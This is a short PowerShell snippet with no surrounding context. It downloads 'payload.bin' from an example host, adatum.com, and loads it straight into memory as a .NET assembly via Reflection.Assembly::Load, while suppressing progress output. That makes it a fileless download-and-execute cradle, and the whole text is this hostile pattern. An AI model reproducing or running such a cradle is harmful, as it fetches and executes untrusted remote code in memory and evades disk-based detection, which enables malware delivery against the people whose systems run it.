$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData('http://adatum.com/payload.bin')
[Reflection.Assembly]::Load($AssemblyBytes)
$ProgressPreference = "SilentlyContinue"
